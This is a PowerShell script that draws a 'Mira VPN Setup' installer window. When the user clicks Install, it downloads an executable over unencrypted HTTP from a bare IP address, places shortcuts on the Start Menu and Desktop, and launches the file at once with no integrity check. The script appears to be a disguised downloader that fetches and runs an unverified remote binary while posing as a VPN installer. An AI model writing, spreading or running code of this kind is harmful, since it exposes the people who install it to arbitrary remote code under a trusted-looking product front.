# Mira VPN Windows Setup
Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "Mira VPN Setup"
$form.Size = New-Object System.Drawing.Size(520, 400)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false
$form.BackColor = [System.Drawing.Color]::FromArgb(255,248,240)

$title = New-Object System.Windows.Forms.Label
$title.Text = "Mira VPN"
$title.Font = New-Object System.Drawing.Font("Segoe UI", 18, [System.Drawing.FontStyle]::Bold)
$title.ForeColor = [System.Drawing.Color]::FromArgb(42,31,45)
$title.AutoSize = $true
$title.Location = New-Object System.Drawing.Point(30, 24)
$form.Controls.Add($title)

$sub = New-Object System.Windows.Forms.Label
$sub.Text = "Smart, private connection. One click after install."
$sub.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$sub.ForeColor = [System.Drawing.Color]::FromArgb(82,74,85)
$sub.AutoSize = $true
$sub.Location = New-Object System.Drawing.Point(30, 56)
$form.Controls.Add($sub)

$ll = New-Object System.Windows.Forms.Label
$ll.Text = "Install location:"
$ll.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$ll.AutoSize = $true
$ll.Location = New-Object System.Drawing.Point(30, 100)
$form.Controls.Add($ll)

$locBox = New-Object System.Windows.Forms.TextBox
$locBox.Text = [Environment]::GetFolderPath("LocalApplicationData") + "\Mira VPN"
$locBox.Width = 380
$locBox.Location = New-Object System.Drawing.Point(30, 124)
$form.Controls.Add($locBox)

$browse = New-Object System.Windows.Forms.Button
$browse.Text = "Browse..."
$browse.Width = 90
$browse.Location = New-Object System.Drawing.Point(416, 122)
$browse.Add_Click({
    $fb = New-Object System.Windows.Forms.FolderBrowserDialog
    if ($fb.ShowDialog() -eq "OK") { $locBox.Text = $fb.SelectedPath }
})
$form.Controls.Add($browse)

$status = New-Object System.Windows.Forms.RichTextBox
$status.Size = New-Object System.Drawing.Size(450, 90)
$status.Location = New-Object System.Drawing.Point(30, 170)
$status.ReadOnly = $true
$status.BackColor = [System.Drawing.Color]::FromArgb(42,31,45)
$status.ForeColor = [System.Drawing.Color]::FromArgb(248,165,160)
$status.Font = New-Object System.Drawing.Font("Consolas", 9)
$form.Controls.Add($status)

function Log($msg) { $status.AppendText("  " + $msg + "`n"); $status.ScrollToCaret(); [System.Windows.Forms.Application]::DoEvents() }

$install = New-Object System.Windows.Forms.Button
$install.Text = "Install"
$install.Width = 120; $install.Height = 36
$install.Location = New-Object System.Drawing.Point(370, 280)
$install.BackColor = [System.Drawing.Color]::FromArgb(248,165,160)
$install.FlatStyle = "Flat"; $install.FlatAppearance.BorderSize = 0
$install.Font = New-Object System.Drawing.Font("Segoe UI", 11, [System.Drawing.FontStyle]::Bold)
$install.ForeColor = [System.Drawing.Color]::White
$install.Add_Click({
    $install.Enabled = $false; $target = $locBox.Text
    Log "Installing to: $target"
    try {
        New-Item -ItemType Directory -Force -Path $target | Out-Null
        Log "[OK] Directory created"
        $exe = "$target\MiraVpn.exe"
        Log "[...] Downloading Mira VPN (71 MB)..."
        Invoke-WebRequest "http://178.104.251.30/vpn/MiraVpn.exe" -OutFile $exe
        Log "[OK] Downloaded"
        $ws = New-Object -ComObject WScript.Shell
        $sd = [Environment]::GetFolderPath("StartMenu") + "\Programs"
        $l1 = $ws.CreateShortcut("$sd\Mira VPN.lnk")
        $l1.TargetPath = $exe; $l1.WorkingDirectory = $target; $l1.Description = "Mira VPN"; $l1.Save()
        $l2 = $ws.CreateShortcut([Environment]::GetFolderPath("Desktop") + "\Mira VPN.lnk")
        $l2.TargetPath = $exe; $l2.WorkingDirectory = $target; $l2.Description = "Mira VPN"; $l2.Save()
        Log "[OK] Shortcuts created"
        Start-Process $exe
        Log "[OK] Launched - check system tray"
        Start-Sleep -Seconds 3; $form.Close()
    } catch { Log "[FAIL] $_"; $install.Enabled = $true }
})
$form.Controls.Add($install)

$cancel = New-Object System.Windows.Forms.Button
$cancel.Text = "Cancel"; $cancel.Width = 100; $cancel.Height = 36
$cancel.Location = New-Object System.Drawing.Point(260, 280)
$cancel.FlatStyle = "Flat"
$cancel.Add_Click({ $form.Close() })
$form.Controls.Add($cancel)

$form.ShowDialog() | Out-Null
